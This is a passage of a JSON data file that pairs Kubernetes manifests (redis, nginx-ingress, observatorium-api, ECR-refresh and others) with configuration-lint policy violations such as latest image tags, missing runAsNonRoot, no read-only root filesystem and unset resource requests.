    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dnstest3\nspec:\n  containers:\n  - image: xtoph/dns\n    command:\n    - /bin/sh\n    - -c\n    - --\n    args:\n    - while true; do sleep 5; done;\n    name: dnstest3\n    resources:\n      requests:\n        memory: 1G\n        cpu: 1\n    ports:\n    - containerPort: 80\n      name: http\n      protocol: TCP\n    - containerPort: 443\n      name: https\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"dnstest3\" has memory limit 0"
  },
  {
    "id": "01420",
    "manifest_path": "data/manifests/the_stack_sample/sample_0451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-deployment\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"redis\" is using an invalid container image, \"redis\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01421",
    "manifest_path": "data/manifests/the_stack_sample/sample_0451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-deployment\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis\" does not have a read-only root file system"
  },
  {
    "id": "01422",
    "manifest_path": "data/manifests/the_stack_sample/sample_0451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-deployment\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"redis\" is not set to runAsNonRoot"
  },
  {
    "id": "01423",
    "manifest_path": "data/manifests/the_stack_sample/sample_0451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-deployment\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"redis\" has cpu request 0"
  },
  {
    "id": "01424",
    "manifest_path": "data/manifests/the_stack_sample/sample_0453.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: ecr-refresh\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - image: public.ecr.aws/m3i7d4x6/ecr-refresh:latest\n          name: ecr-refresh\n          env:\n          - name: AWS_REGION\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_region\n          - name: AWS_ACCESS_KEY_ID\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_access_key_id\n          - name: AWS_SECRET_ACCESS_KEY\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_secret_access_key\n          volumeMounts:\n          - name: config\n            mountPath: /config\n            readOnly: true\n        serviceAccountName: svc-ecr-refresh\n        volumes:\n        - name: config\n          configMap:\n            name: ecr-refresh\n            items:\n            - key: application.yml\n              path: application.yml\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ecr-refresh\" is using an invalid container image, \"public.ecr.aws/m3i7d4x6/ecr-refresh:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01425",
    "manifest_path": "data/manifests/the_stack_sample/sample_0453.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: ecr-refresh\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - image: public.ecr.aws/m3i7d4x6/ecr-refresh:latest\n          name: ecr-refresh\n          env:\n          - name: AWS_REGION\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_region\n          - name: AWS_ACCESS_KEY_ID\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_access_key_id\n          - name: AWS_SECRET_ACCESS_KEY\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_secret_access_key\n          volumeMounts:\n          - name: config\n            mountPath: /config\n            readOnly: true\n        serviceAccountName: svc-ecr-refresh\n        volumes:\n        - name: config\n          configMap:\n            name: ecr-refresh\n            items:\n            - key: application.yml\n              path: application.yml\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ecr-refresh\" does not have a read-only root file system"
  },
  {
    "id": "01426",
    "manifest_path": "data/manifests/the_stack_sample/sample_0453.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: ecr-refresh\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - image: public.ecr.aws/m3i7d4x6/ecr-refresh:latest\n          name: ecr-refresh\n          env:\n          - name: AWS_REGION\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_region\n          - name: AWS_ACCESS_KEY_ID\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_access_key_id\n          - name: AWS_SECRET_ACCESS_KEY\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_secret_access_key\n          volumeMounts:\n          - name: config\n            mountPath: /config\n            readOnly: true\n        serviceAccountName: svc-ecr-refresh\n        volumes:\n        - name: config\n          configMap:\n            name: ecr-refresh\n            items:\n            - key: application.yml\n              path: application.yml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ecr-refresh\" is not set to runAsNonRoot"
  },
  {
    "id": "01427",
    "manifest_path": "data/manifests/the_stack_sample/sample_0453.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: ecr-refresh\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - image: public.ecr.aws/m3i7d4x6/ecr-refresh:latest\n          name: ecr-refresh\n          env:\n          - name: AWS_REGION\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_region\n          - name: AWS_ACCESS_KEY_ID\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_access_key_id\n          - name: AWS_SECRET_ACCESS_KEY\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_secret_access_key\n          volumeMounts:\n          - name: config\n            mountPath: /config\n            readOnly: true\n        serviceAccountName: svc-ecr-refresh\n        volumes:\n        - name: config\n          configMap:\n            name: ecr-refresh\n            items:\n            - key: application.yml\n              path: application.yml\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ecr-refresh\" has cpu request 0"
  },
  {
    "id": "01428",
    "manifest_path": "data/manifests/the_stack_sample/sample_0453.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: ecr-refresh\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - image: public.ecr.aws/m3i7d4x6/ecr-refresh:latest\n          name: ecr-refresh\n          env:\n          - name: AWS_REGION\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_region\n          - name: AWS_ACCESS_KEY_ID\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_access_key_id\n          - name: AWS_SECRET_ACCESS_KEY\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_secret_access_key\n          volumeMounts:\n          - name: config\n            mountPath: /config\n            readOnly: true\n        serviceAccountName: svc-ecr-refresh\n        volumes:\n        - name: config\n          configMap:\n            name: ecr-refresh\n            items:\n            - key: application.yml\n              path: application.yml\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ecr-refresh\" has memory limit 0"
  },
  {
    "id": "01429",
    "manifest_path": "data/manifests/the_stack_sample/sample_0454.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: open-saves-gke\n  labels:\n    app: open-saves-server\n  namespace: open-saves-namespace\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: open-saves-server\n  template:\n    metadata:\n      labels:\n        app: open-saves-server\n    spec:\n      containers:\n      - name: open-saves\n        image: gcr.io/triton-for-games-dev/triton-server:testing\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6000\n      serviceAccountName: open-saves-ksa\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"open-saves\" does not have a read-only root file system"
  },
  {
    "id": "01430",
    "manifest_path": "data/manifests/the_stack_sample/sample_0454.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: open-saves-gke\n  labels:\n    app: open-saves-server\n  namespace: open-saves-namespace\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: open-saves-server\n  template:\n    metadata:\n      labels:\n        app: open-saves-server\n    spec:\n      containers:\n      - name: open-saves\n        image: gcr.io/triton-for-games-dev/triton-server:testing\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6000\n      serviceAccountName: open-saves-ksa\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"open-saves\" is not set to runAsNonRoot"
  },
  {
    "id": "01431",
    "manifest_path": "data/manifests/the_stack_sample/sample_0454.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: open-saves-gke\n  labels:\n    app: open-saves-server\n  namespace: open-saves-namespace\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: open-saves-server\n  template:\n    metadata:\n      labels:\n        app: open-saves-server\n    spec:\n      containers:\n      - name: open-saves\n        image: gcr.io/triton-for-games-dev/triton-server:testing\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6000\n      serviceAccountName: open-saves-ksa\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"open-saves\" has cpu request 0"
  },
  {
    "id": "01432",
    "manifest_path": "data/manifests/the_stack_sample/sample_0454.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: open-saves-gke\n  labels:\n    app: open-saves-server\n  namespace: open-saves-namespace\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: open-saves-server\n  template:\n    metadata:\n      labels:\n        app: open-saves-server\n    spec:\n      containers:\n      - name: open-saves\n        image: gcr.io/triton-for-games-dev/triton-server:testing\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6000\n      serviceAccountName: open-saves-ksa\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"open-saves\" has memory limit 0"
  },
  {
    "id": "01433",
    "manifest_path": "data/manifests/the_stack_sample/sample_0456.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.8.3\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-ingress-lb\" does not have a read-only root file system"
  },
  {
    "id": "01434",
    "manifest_path": "data/manifests/the_stack_sample/sample_0456.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.8.3\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-ingress-lb\" is not set to runAsNonRoot"
  },
  {
    "id": "01435",
    "manifest_path": "data/manifests/the_stack_sample/sample_0456.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.8.3\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-ingress-lb\" has cpu request 0"
  },
  {
    "id": "01436",
    "manifest_path": "data/manifests/the_stack_sample/sample_0456.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.8.3\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-ingress-lb\" has memory limit 0"
  },
  {
    "id": "01437",
    "manifest_path": "data/manifests/the_stack_sample/sample_0457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-api\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n  name: observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-api\n      app.kubernetes.io/name: observatorium-api\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-api\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --metrics.read.endpoint=http://127.0.0.1:9091\n        - --metrics.write.endpoint=http://127.0.0.1:19291\n        - --log.level=warn\n        - --logs.read.endpoint=http://127.0.0.1:3100\n        - --logs.tail.endpoint=http://127.0.0.1:3100\n        - --logs.write.endpoint=http://127.0.0.1:3100\n        - --rbac.config=/etc/observatorium/rbac.yaml\n        - --tenants.config=/etc/observatorium/tenants.yaml\n        - --web.healthchecks.url=https://127.0.0.1:8080\n        - --tls.server.cert-file=/var/run/tls/cert\n        - --tls.server.key-file=/var/run/tls/key\n        - --tls.healthchecks.server-ca-file=/var/run/tls/ca\n        - --tls.reload-interval=1m\n        - --tls.healthchecks.server-name=example.com\n        image: quay.io/observatorium/api:master-2020-09-04-v0.1.1-131-ga4c5a9c\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/observatorium/rbac.yaml\n          name: rbac\n          readOnly: true\n          subPath: rbac.yaml\n        - mountPath: /etc/observatorium/tenants.yaml\n          name: tenants\n          readOnly: true\n          subPath: tenants.yaml\n        - mountPath: /var/run/tls/cert\n          name: tls-secret\n          readOnly: true\n          subPath: cert\n        - mountPath: /var/run/tls/key\n          name: tls-secret\n          readOnly: true\n          subPath: key\n        - mountPath: /var/run/tls/ca\n          name: tls-configmap\n          readOnly: true\n          subPath: ca\n      serviceAccountName: observatorium-api\n      volumes:\n      - configMap:\n          name: observatorium-api\n        name: rbac\n      - name: tenants\n        secret:\n          secretName: observatorium-api\n      - name: tls-secret\n        secret:\n          secretName: observatorium-api-tls\n      - configMap:\n          name: observatorium-api-tls\n        name: tls-configmap\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"observatorium-api\" does not have a read-only root file system"
  },
  {
    "id": "01438",
    "manifest_path": "data/manifests/the_stack_sample/sample_0457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-api\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n  name: observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-api\n      app.kubernetes.io/name: observatorium-api\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-api\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --metrics.read.endpoint=http://127.0.0.1:9091\n        - --metrics.write.endpoint=http://127.0.0.1:19291\n        - --log.level=warn\n        - --logs.read.endpoint=http://127.0.0.1:3100\n        - --logs.tail.endpoint=http://127.0.0.1:3100\n        - --logs.write.endpoint=http://127.0.0.1:3100\n        - --rbac.config=/etc/observatorium/rbac.yaml\n        - --tenants.config=/etc/observatorium/tenants.yaml\n        - --web.healthchecks.url=https://127.0.0.1:8080\n        - --tls.server.cert-file=/var/run/tls/cert\n        - --tls.server.key-file=/var/run/tls/key\n        - --tls.healthchecks.server-ca-file=/var/run/tls/ca\n        - --tls.reload-interval=1m\n        - --tls.healthchecks.server-name=example.com\n        image: quay.io/observatorium/api:master-2020-09-04-v0.1.1-131-ga4c5a9c\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/observatorium/rbac.yaml\n          name: rbac\n          readOnly: true\n          subPath: rbac.yaml\n        - mountPath: /etc/observatorium/tenants.yaml\n          name: tenants\n          readOnly: true\n          subPath: tenants.yaml\n        - mountPath: /var/run/tls/cert\n          name: tls-secret\n          readOnly: true\n          subPath: cert\n        - mountPath: /var/run/tls/key\n          name: tls-secret\n          readOnly: true\n          subPath: key\n        - mountPath: /var/run/tls/ca\n          name: tls-configmap\n          readOnly: true\n          subPath: ca\n      serviceAccountName: observatorium-api\n      volumes:\n      - configMap:\n          name: observatorium-api\n        name: rbac\n      - name: tenants\n        secret:\n          secretName: observatorium-api\n      - name: tls-secret\n        secret:\n          secretName: observatorium-api-tls\n      - configMap:\n          name: observatorium-api-tls\n        name: tls-configmap\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"observatorium-api\" is not set to runAsNonRoot"
  },
  {
    "id": "01439",
    "manifest_path": "data/manifests/the_stack_sample/sample_0457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-api\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n  name: observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-api\n      app.kubernetes.io/name: observatorium-api\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-api\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --metrics.read.endpoint=http://127.0.0.1:9091\n        - --metrics.write.endpoint=http://127.0.0.1:19291\n        - --log.level=warn\n        - --logs.read.endpoint=http://127.0.0.1:3100\n        - --logs.tail.endpoint=http://127.0.0.1:3100\n        - --logs.write.endpoint=http://127.0.0.1:3100\n        - --rbac.config=/etc/observatorium/rbac.yaml\n        - --tenants.config=/etc/observatorium/tenants.yaml\n        - --web.healthchecks.url=https://127.0.0.1:8080\n        - --tls.server.cert-file=/var/run/tls/cert\n        - --tls.server.key-file=/var/run/tls/key\n        - --tls.healthchecks.server-ca-file=/var/run/tls/ca\n        - --tls.reload-interval=1m\n        - --tls.healthchecks.server-name=example.com\n        image: quay.io/observatorium/api:master-2020-09-04-v0.1.1-131-ga4c5a9c\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/observatorium/rbac.yaml\n          name: rbac\n          readOnly: true\n          subPath: rbac.yaml\n        - mountPath: /etc/observatorium/tenants.yaml\n          name: tenants\n          readOnly: true\n          subPath: tenants.yaml\n        - mountPath: /var/run/tls/cert\n          name: tls-secret\n          readOnly: true\n          subPath: cert\n        - mountPath: /var/run/tls/key\n          name: tls-secret\n          readOnly: true\n          subPath: key\n        - mountPath: /var/run/tls/ca\n          name: tls-configmap\n          readOnly: true\n          subPath: ca\n      serviceAccountName: observatorium-api\n      volumes:\n      - configMap:\n          name: observatorium-api\n        name: rbac\n      - name: tenants\n        secret:\n          secretName: observatorium-api\n      - name: tls-secret\n        secret:\n          secretName: observatorium-api-tls\n      - configMap:\n          name: observatorium-api-tls\n        name: tls-configmap\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"observatorium-api\" has cpu request 0"
  },
  {
    "id": "01440",
    "manifest_path": "data/manifests/the_stack_sample/sample_0457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-api\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n  name: observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-api\n      app.kubernetes.io/name: observatorium-api\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-api\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --metrics.read.endpoint=http://127.0.0.1:9091\n        - --metrics.write.endpoint=http://127.0.0.1:19291\n        - --log.level=warn\n        - --logs.read.endpoint=http://127.0.0.1:3100\n        - --logs.tail.endpoint=http://127.0.0.1:3100\n        - --logs.write.endpoint=http://127.0.0.1:3100\n        - --rbac.config=/etc/observatorium/rbac.yaml\n        - --tenants.config=/etc/observatorium/tenants.yaml\n        - --web.healthchecks.url=https://127.0.0.1:8080\n        - --tls.server.cert-file=/var/run/tls/cert\n        - --tls.server.key-file=/var/run/tls/key\n        - --tls.healthchecks.server-ca-file=/var/run/tls/ca\n        - --tls.reload-interval=1m\n        - --tls.healthchecks.server-name=example.com\n        image: quay.io/observatorium/api:master-2020-09-04-v0.1.1-131-ga4c5a9c\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/observatorium/rbac.yaml\n          name: rbac\n          readOnly: true\n          subPath: rbac.yaml\n        - mountPath: /etc/observatorium/tenants.yaml\n          name: tenants\n          readOnly: true\n          subPath: tenants.yaml\n        - mountPath: /var/run/tls/cert\n          name: tls-secret\n          readOnly: true\n          subPath: cert\n        - mountPath: /var/run/tls/key\n          name: tls-secret\n          readOnly: true\n          subPath: key\n        - mountPath: /var/run/tls/ca\n          name: tls-configmap\n          readOnly: true\n          subPath: ca\n      serviceAccountName: observatorium-api\n      volumes:\n      - configMap:\n          name: observatorium-api\n        name: rbac\n      - name: tenants\n        secret:\n          secretName: observatorium-api\n      - name: tls-secret\n        secret:\n          secretName: observatorium-api-tls\n      - configMap:\n          name: observatorium-api-tls\n        name: tls-configmap\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"observatorium-api\" has memory limit 0"
  },
  {
    "id": "01441",
    "manifest_path": "data/manifests/the_stack_sample/sample_0458.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220128-eb56385920\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
